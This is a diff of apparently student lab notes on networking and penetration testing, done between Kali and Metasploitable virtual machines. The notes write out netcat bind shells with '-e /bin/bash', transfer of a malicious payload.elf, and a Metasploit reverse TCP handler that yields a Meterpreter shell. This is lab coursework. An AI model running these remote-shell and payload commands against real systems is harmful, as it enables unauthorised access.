@@ -24,6 +24,7 @@ $\rightarrow$ [MS On The Issues](https://blogs.microsoft.com/on-the-issues/2023/
 $\rightarrow$ [Results of Major Investigations](https://www.microsoft.com/en-us/msrc/blog/2023/09/results-of-major-technical-investigations-for-storm-0558-key-acquisition)
 
 ## 02.b 
+
 ### 02.b.1 **Networking options** 
 > Write down the explanation for:
 > - Network Address Translation
@@ -66,7 +67,6 @@ We should write the following command to inspect both `interfaces` and `ip addre
 
 We will get something as follows:
 ```bash
-kali㉿kali$ ip a sh
 vagrant@ubuntu:~$ ip address show
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -112,7 +112,6 @@ In order to identify `routes` we need another command, similar to the previous o
 
 We will get:
 ```bash
-kali㉿kali$ ip r sh
 vagrant@ubuntu:~$ ip route show
 default via 10.0.2.2 dev eth0 
 10.0.2.0/24 dev eth0  proto kernel  scope link  src 10.0.2.15 
@@ -174,6 +173,7 @@ unix  2      [ ]         DGRAM      CONNECTED     6603
 unix  3      [ ]         STREAM     CONNECTED     11029    /run/user/1000/at-spi/bus_0
 unix  3      [ ]         STREAM     CONNECTED     6272     /run/systemd/journal/stdout
 unix  3      [ ]         STREAM     CONNECTED     15496    /run/dbus/system_bus_socket
+...
 ```
 
 As we already know, a socket is a software structure that serves as an endpoint for sending and receiving data across the network. The bash code above shows always a specific type of socket, called **Unix Domain Socket**: they are not used for the communication via Internet but just for the communication between internal processes of the virtual machine.
@@ -193,6 +193,7 @@ unix  3      [ ]         STREAM     CONNECTED     10489
 unix  3      [ ]         STREAM     CONNECTED     10007    
 unix  3      [ ]         STREAM     CONNECTED     9214     /run/user/1000/bus
 unix  3      [ ]         STREAM     CONNECTED     11387    /run/user/1000/bus
+...
 ```
 
 Right now, we don't have anymore only software structures for the communication between internal processes, but also an **UDP** connection for the communication with an external server.
@@ -206,7 +207,7 @@ Therefore, we execute the following two commands:
 2. `nmap -sP ip/subnet`: displaying all the other devices already connected to the same local network
 
 ```bash
-kali㉿kali$ ip a sh
+kali㉿kali$ ip address show
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -219,6 +220,7 @@ kali㉿kali$ ip a sh
        valid_lft 470sec preferred_lft 470sec
     inet6 fe80::7f3c:cb9f:84c8:fa4e/64 scope link noprefixroute 
        valid_lft forever preferred_lft forever
+...
 ```
 
 We take in account the IP address `10.0.0.24` with its subnet mask, and finally we run `nmap` command: we should get the list of all the devices already connected to the same local network.
@@ -238,6 +240,7 @@ MAC Address: 08:00:27:15:DA:61 (Oracle VirtualBox virtual NIC)
 Nmap scan report for 10.0.2.4
 Host is up.
 Nmap done: 256 IP addresses (4 hosts up) scanned in 3.14 seconds
+kali㉿kali$
 ```
 
 `netcat`: powerful tool for creating TCP/IP connections. 
@@ -258,7 +261,7 @@ connect to [127.0.0.1] from localhost [127.0.0.1] 46324
 ```
 
 ```bash
-kali㉿kali$ nc 127.0.0.1 8080
+kali㉿kali$ netcat 127.0.0.1 8080
 The quick fox jump over the dog
 ```
 
@@ -271,22 +274,22 @@ The quick fox jump over the dog
 
 Via `netcat` we can also connect to a remote shell. The commands in this case are a little bit different, but they follow the same structure as before.
 1. `netcat -e /bin/bash 8080`: starting for listening incoming connections on port 8080, allowing anyone with access to execute commands in the system
-2. `nc 127.0.0.1 8080`: establishing the TCP connection with the service available on port 8080
+2. `netcat 127.0.0.1 8080`: establishing the TCP connection with the service available on port 8080
 
 From now on we have free access to the endpoint system: we can execute any type of command we want.
 
 ```bash
-kali㉿kali$ nc -lvp 8080 -e /bin/bash
+kali㉿kali$ netcat -lvp 8080 -e /bin/bash
 listening on [any] 8080 ...
 ```
 
 ```bash
-kali㉿kali$ nc 127.0.0.1 8080
+kali㉿kali$ netcat 127.0.0.1 8080
 whoami
 ```
 
 ```bash
-kali㉿kali$ nc 127.0.0.1 8080
+kali㉿kali$ netcat 127.0.0.1 8080
 whoami
 kali
 ```
@@ -294,17 +297,17 @@ kali
 We can do the same thing between the Kali and Metasploitable virtual machines. The only difference is that instead of the loopback IP, we must use the Kali's local IP address.
 
 ```bash
-kali㉿kali$ nc -lvp 8080 -e /bin/bash
+kali㉿kali$ netcat -lvp 8080 -e /bin/bash
 listening on [any] 8080 ...
 ```
 
 ```bash
-vagrant@ubuntu$ nc 10.0.2.4 8080
+vagrant@ubuntu$ netcat 10.0.2.4 8080
 ls -l
 ```
 
 ```bash
-vagrant@ubuntu$ nc 10.0.2.4 8080
+vagrant@ubuntu$ netcat 10.0.2.4 8080
 ls -l
 total 48
 drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Desktop
@@ -323,11 +326,11 @@ drwxr-xr-x 2 kali kali 4096 Sep  3 12:38 Videos
 Another useful feature of `netcat` is the ability to transfer files between endpoints. In this case, we try to share a single file between Kali and Metasploitable virtual machines, using the first one as `sender` and the second one as `receiver`.
 
 ```bash
-kali㉿kali$ nc -lvp 8080 < test_1.txt
+kali㉿kali$ netcat -lvp 8080 < test_1.txt
 ```
 
 ```bash
-vagrant@ubuntu$ nc 10.0.2.4 8080 > test_1.txt
+vagrant@ubuntu$ netcat 10.0.2.4 8080 > test_1.txt
 ```
 
 At the end, Metasploitable virtual machine will receive `test_1.txt` sent by Kali virtual machine, saving it inside its own system.
@@ -360,7 +363,7 @@ In all of the cases, the `payload` is provided by the attacker. However, we have
 
 Once all these commands have been executed, in our current directory will be created a new file called `payload.elf`, which it will be transfered to the target machine through a `netcat` TCP connection.
 ```bash
-kali㉿kali$ nc -lvp 8080 < payload.elf
+kali㉿kali$ netcat -lvp 8080 < payload.elf
 listening on [any] 8080 ...
 connect to [127.0.0.1] from localhost [127.0.0.1] 46324
 ```
@@ -368,7 +371,7 @@ connect to [127.0.0.1] from localhost [127.0.0.1] 46324
 Port 8080 is listening for any incoming connection, therefore the next step is to establish a communication by the target virtual machine.
 
 ```bash
-vagrant@ubuntu$ nc 10.0.2.4 8080 > payload.elf
+vagrant@ubuntu$ netcat 10.0.2.4 8080 > payload.elf
 ```
 
 If the target machine runs this malicious executable, we can remotely access the target machine using `metasploit`, until its execution is stopped. The last step before the real execution, it's to set up a listener inside the attacker's machine: as soon as the target machine runs the `payload`, it activates and sends an outgoing call to the attacker's machine, establishing a connection between them.
@@ -387,7 +390,6 @@ msf exploit(multi/handler) > set LHOST 10.0.2.4
 msf exploit(multi/handler) > set LPORT 8080
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.0.2.4:8080 
-
 ```
 
 We set up a listener, `metasploit` will wait until the target machine runs the malicious executable. Once executed, the malicious `payload` will then connect to the server we just now started and it will provide us a `Meterpreter` shell, allowing us to access to the target machine system.
@@ -435,3 +437,5 @@ BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 meterpreter > 
 ```
+
+> Note: `Metasploit` was run on the Kali virtual machine.
